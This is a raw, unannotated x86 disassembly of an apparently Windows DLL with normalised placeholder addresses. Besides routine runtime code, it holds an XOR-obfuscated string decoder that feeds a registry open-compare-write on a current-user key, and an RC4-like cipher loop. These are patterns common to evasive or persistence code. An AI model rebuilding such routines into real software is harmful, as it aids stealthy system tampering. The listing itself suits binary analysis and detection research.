mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ebx [ r--data ]
mov edi edx
mov esi [ esi ]
mov [ esp + 0xc ] esi
test esi esi
je r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jl r-xdata
jg r-xdata
jg r-xdata
mov edx [ ecx + 0x10 ]
mov esi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
mov edx [ ecx + 0x10 ]
mov esi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
mov edx [ r--data ]
jl r-xdata
jl r-xdata
sub esi [ esp + 0xc ]
mov eax [ ecx + 0x30 ]
sar esi 0x1
add esi edi
sub [ eax ] esi
mov eax [ ecx + 0x20 ]
lea edx [ esi + esi ]
add [ eax ] edx
test [ ebp + 0x24 ] 0x2
je r-xdata
cmp edi eax
ja r-xdata
sub esi [ esp + 0xc ]
mov eax [ ecx + 0x34 ]
sar esi 0x1
add esi edi
sub [ eax ] esi
mov ecx [ ecx + 0x24 ]
lea eax [ esi + esi ]
add [ ecx ] eax
jmp r-xdata
cmp edi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov esi [ ecx + 0x34 ]
mov edx [ ecx + 0x20 ]
mov esi [ esi ]
mov edx [ edx ]
lea eax [ eax + esi * 2 ]
mov esi [ ecx + 0x24 ]
mov [ esi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
sar eax 0x1
mov [ ecx ] eax
jmp r-xdata
sub_1002d6c6
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10043fb5
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_1002d770
push ebp
mov ebp esp
sub esp 0x234
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x22c ] eax
mov eax [ ebp + 0x8 ]
push eax
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x230 ] edx
call sub_1000e9f0
add esp 0x4
test eax eax
mov eax 0x2
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
lea edx [ ebp - 0x224 ]
call sub_10072130
mov edi [ rw-data ]
cmp [ edi + 0x120 ] 0x0
je r-xdata
pop edi
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push 0x208
lea ecx [ ebp - 0x21c ]
push 0x0
push ecx
call sub_1007f8f0
lea edx [ ebp - 0x220 ]
push edx
call sub_10026420
mov ecx [ ebp - 0x220 ]
mov eax 0xcccccccd
mul ecx
mov eax [ edi + 0x120 ]
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov [ ebp - 0x220 ] ecx
imul ecx ecx 0x208
lea ebx [ ecx + eax + 0x1082c ]
add esp 0x10
mov ecx 0x104
lea eax [ ebp - 0x21c ]
xor esi esi
nop
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x21c ]
push ebx
mov edx 0x7fffffff
call sub_10072780
lea eax [ ebp - 0x224 ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea edx [ ebp - 0x220 ]
push edx
call sub_10026420
mov ecx [ ebp - 0x220 ]
mov eax 0xcccccccd
mul ecx
mov eax [ edi + 0x120 ]
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov [ ebp - 0x220 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea ecx [ ecx + eax + 0x11c7c ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x21c ]
call sub_10050c60
test eax eax
je r-xdata
lea ecx [ ebp - 0x224 ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x21c ]
call sub_10050c60
test eax eax
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x1
call sub_10072130
mov edx [ ebp - 0x22c ]
mov ecx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x228 ]
lea eax [ ebp - 0x21c ]
push eax
push ecx
mov ecx [ ebp - 0x230 ]
push edx
lea edx [ ebp - 0x14 ]
call sub_10060560
add esp 0x10
neg eax
pop edi
sbb eax eax
pop esi
and eax 0x4
pop ebx
sub_1002d970
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
mov eax [ ebp + 0x10 ]
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_100651be
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0x7ffffffe
jbe r-xdata
push 0xffffffff
add edi ebx
push edi
mov ecx esi
call sub_1005bd10
push ebx
push 0x0
mov ecx esi
call sub_1005bd10
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_10030594
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_10071bf0
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x8
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
xor ecx ecx
pop esi
mov [ eax ] cx
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
mov [ ebx + eax ] dx
mov eax [ esi ]
xor edx edx
mov [ ebx + eax ] dx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx [ ebp + 0xc ]
lea ebx [ edi + edi ]
push ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_1007f580
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_1002da69
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100453c6
add esp 0xc
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
mov eax 0x7fffffff
jmp r-xdata
sub esi ecx
pop esi
pop ebp
retn
mov edx eax
cmp eax 0x5a
ja r-xdata
add ecx 0x2
test dx dx
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
sub eax ecx
jmp r-xdata
cmp dx ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp eax 0x41
jb r-xdata
movzx eax [ esi + ecx ]
cmp eax 0x41
jb r-xdata
sub_1002db00
mov eax [ esi + 0x4 ]
dec [ eax ]
jne r-xdata
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] 0x0
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x4 ] 0x0
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1002db40
push ebp
mov ebp esp
push 0xffffffff
push sub_100868b8
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi edx
cmp esi edi
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1006a3e0
mov esi [ esi ]
test esi esi
je r-xdata
lea esp [ esp ]
push 0x40
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov [ edi ] ebx
xor eax eax
mov ecx [ esi ]
push ecx
mov ecx eax
call sub_1000b3f0
jmp r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
cmp [ edi ] 0x0
mov ebx eax
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebx ] eax
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_1002dbf0
push ebp
mov ebp esp
sub esp 0x31c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x75
and edx 0xff
mov [ ebp + eax * 2 - 0xb8 ] dx
inc eax
cmp eax 0x29
jb r-xdata
push esi
mov esi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0x318 ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0xb8 ]
push edx
push 0x80000001
mov [ ebp - 0x66 ] ax
call esi
test eax eax
je r-xdata
xor eax eax
movzx edx ax
mov eax edx
push edi
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x314 ]
[ edi ]
lea edx [ ebp - 0x3c ]
mov eax 0x50
mov [ ebp - 0x31c ] 0x206
call sub_10069020
lea eax [ ebp - 0x31c ]
push eax
mov eax [ ebp - 0x318 ]
lea ecx [ ebp - 0x314 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x318 ]
mov edi [ RegCloseKey@IAT ]
push ecx
call edi
lea edx [ ebp - 0x10c ]
mov eax 0x53
call sub_10069020
lea edx [ ebp - 0x318 ]
push edx
push 0x2
push 0x0
lea eax [ ebp - 0x10c ]
push eax
push 0x80000001
call esi
test eax eax
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0xe4
call sub_10069020
mov ecx edx
push ecx
lea edx [ ebp - 0x314 ]
push edx
call [ StrCmpW@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0x39
call sub_10069020
lea edx [ ebp - 0xc ]
mov eax 0x74
call sub_10069020
mov eax [ ebp - 0x318 ]
push 0x6
mov ecx edx
push ecx
push 0x1
push 0x0
lea edx [ ebp - 0x64 ]
push edx
push eax
call [ RegSetValueExW@IAT ]
test eax eax
je r-xdata
pop edi
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x318 ]
push eax
call [ RegCloseKey@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x318 ]
push edx
call edi
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x318 ]
push ecx
call edi
pop edi
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1002ddde
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
movsx eax [ ebp + 0x28 ]
push esi
mov esi [ ebp + 0x20 ]
push edi
xor edi edi
add eax 0xffffffbf
mov [ ebp - 0x4 ] edi
cmp eax 0x38
ja r-xdata
or [ esi ] 0x2
movzx eax [ eax + lookup_table_1002e0ca ]
jmp [ eax * 4 + jump_table_1002e06e ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop edi
mov [ eax + 0x4 ] ecx
pop esi
leave
retn 0x28
or [ esi ] 0x1
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x14 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x14 ]
mov eax [ ebp - 0x14 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x10 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1003a496
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push r--data
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0x17
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0xb
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x16e
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1003a496
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x4
push eax
push r--data
lea eax [ ebp - 0x34 ]
jmp r-xdata
push r--data
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1005f353
add esp 0x10
cmp eax edi
jl r-xdata
push r--data
lea eax [ ebp - 0x3c ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x44 ]
jmp r-xdata
push [ ebp + 0x24 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x4c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x35
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x18
push eax
push 0x6
jmp r-xdata
push r--data
lea eax [ ebp - 0x54 ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1003a496
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x18 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0xffffffed
imul eax eax 0x64
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10057c68
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1003a496
add esp 0x18
or [ esi ] eax
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x24 ]
dec eax
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0x24 ]
imul eax eax 0xc
add [ ecx + 0x8 ] eax
jmp r-xdata
push 0x3b
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x45
jge r-xdata
mov ecx [ ebp + 0x24 ]
mov [ ecx + 0x14 ] eax
jmp r-xdata
add eax 0x64
jmp r-xdata
sub_1002e103
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
mov esi [ ebp + 0x8 ]
test ecx 0xfcf0fce0
je r-xdata
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_1000b055
call sub_1000b055
mov [ esi ] eax
jmp r-xdata
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
call sub_1004b131
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_1000b055
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_1002e170
push ebp
mov ebp esp
push 0xffffffff
push sub_10086e22
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_100273a0
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0xffffffff
xor eax eax
push edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] ax
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_100273a0
push 0xffffffff
xor esi esi
push edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] si
push eax
jmp r-xdata
call sub_1002d970
sub_1002e250
push ebp
mov ebp esp
cmp [ ebx ] 0x0
mov [ edx ] 0x0
jbe r-xdata
pop ebp
retn
push esi
mov esi [ eax * 4 + rw-data ]
mov ecx [ rw-data ]
add ecx esi
and ecx 0x800000ff
mov [ rw-data ] eax
jns r-xdata
dec eax
or eax 0xffffff00
inc eax
mov [ edi ] esi
mov esi [ ecx * 4 + rw-data ]
mov [ eax * 4 + rw-data ] esi
mov esi [ edi ]
mov [ ecx * 4 + rw-data ] esi
mov eax [ eax * 4 + rw-data ]
add eax esi
and eax 0x800000ff
mov [ rw-data ] ecx
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
mov ecx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
mov esi [ esi ]
mov [ ecx ] eax
mov ecx [ edx ]
mov al [ eax * 4 + rw-data ]
xor al [ ecx + esi ]
mov esi [ ebp + 0xc ]
mov esi [ esi ]
mov [ ecx + esi ] al
inc ecx
mov [ edx ] ecx
cmp ecx [ ebx ]
jb r-xdata
dec eax
or eax 0xffffff00
inc eax
mov eax [ rw-data ]
inc eax
and eax 0x800000ff
jns r-xdata
pop esi
sub_1002e320
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push r--data
mov esi 0x2
call [ CreateFileW@IAT ]
push 0x0
lea ecx [ ebp - 0x110 ]
push ecx
push 0x104
lea edx [ ebp - 0x108 ]
push edx
push eax
call [ ReadFile@IAT ]
lea eax [ ebp - 0x10c ]
mov [ ebp - 0x10c ] eax
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x10c ]
test ecx ecx
jne r-xdata
sub eax 0x6
test ecx ecx
jne r-xdata
inc eax
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
imul eax esi
xor ecx ebp
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1002e3ac
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10021090
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_10048fd4
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_10015c68
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_10055e2a
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_1003a910
push sub_1008af83
mov [ rw-data ] esi
call sub_10064546
pop ecx
sub_1002e42c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1002e453
push 0x60
mov eax sub_10085794
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
xor ebx ebx
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
inc ebx
test [ esi + 0x14 ] 0x4000
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x6c ] eax
mov ecx esi
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_10007a10
mov esi [ esi + 0x14 ]
lea ecx [ ebp - 0x5c ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x4
call sub_1006406d
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10046885
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_1002be90
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10007a10
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_1004aa10
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_1002be90
push edi
xor eax eax
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x38 ] 0x7
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] ax
call sub_1006a41c
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_100332a0
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_10006414
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10069470
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_1002f56c
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1002f75b
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_10006414
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10069470
cmp [ ebp - 0x38 ] 0x8
mov eax [ ebp - 0x4c ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100124be
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10069470
jmp r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_1002e600
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x458 ]
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x408 ] ebx
mov [ ebp - 0x430 ] ebx
mov [ ebp - 0x40c ] ebx
mov [ ebp - 0x428 ] ebx
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x42c ] ebx
call sub_10051cf5
call sub_1005b670
mov [ ebp - 0x464 ] eax
cmp [ ebp - 0x424 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x44c ] bl
movzx ecx [ esi ]
xor edx edx
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x414 ] ebx
mov [ ebp - 0x43c ] ebx
mov [ ebp - 0x41c ] ecx
cmp cx bx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x44c ] 0x0
je r-xdata
push 0x2
pop ebx
add esi ebx
cmp [ ebp - 0x418 ] 0x0
mov [ ebp - 0x440 ] esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
mov eax [ ebp - 0x418 ]
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ecx - 0x20 ]
cmp ax 0x58
ja r-xdata
xor eax eax
movzx eax cx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov esi [ ebp - 0x440 ]
movzx eax [ esi ]
mov [ ebp - 0x41c ] eax
test ax ax
je r-xdata
jmp [ eax * 4 + jump_table_1002f1a8 ]
movsx eax [ edx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop edx
mov [ ebp - 0x460 ] eax
cmp eax edx
ja r-xdata
mov edx [ ebp - 0x460 ]
mov edi [ ebp - 0x420 ]
mov ecx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x468 ] eax
mov [ ebp - 0x448 ] eax
mov [ ebp - 0x430 ] eax
